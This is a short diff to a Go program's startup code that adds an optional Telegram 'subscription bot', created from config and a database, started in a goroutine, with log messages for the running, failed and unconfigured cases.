@@ -307,6 +307,18 @@ if err != nil {
 	}
 	go hp.Start()
 
+	// Start Telegram subscription bot if configured
+	tbot, err := core.NewTelegramBot(cfg, db)
+	if err != nil {
+		log.Error("telegram bot: %v", err)
+	} else if tbot != nil {
+		core.GlobalBot = tbot
+		go tbot.Start()
+		log.Info("telegram bot: running")
+	} else {
+		log.Info("telegram bot: not configured (set bot_token + bot_admin_chat_id in config)")
+	}
+
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
 		log.Fatal("%v", err)
